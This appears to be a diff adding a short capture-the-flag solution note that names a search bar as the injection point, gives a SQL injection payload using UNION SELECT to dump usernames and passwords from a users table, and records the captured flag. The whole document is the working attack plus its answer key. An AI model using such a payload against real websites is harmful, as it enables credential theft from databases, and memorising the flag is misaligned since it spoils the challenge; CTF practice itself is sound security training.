@@ -1,0 +1,3 @@
+Input field : search bar
+payload : "and 0  union select username, password, NULL FROM users -- \"
+flag : FLAG-d4mn_Y0ur3_G3tt1ng_G00d_4t_Th15
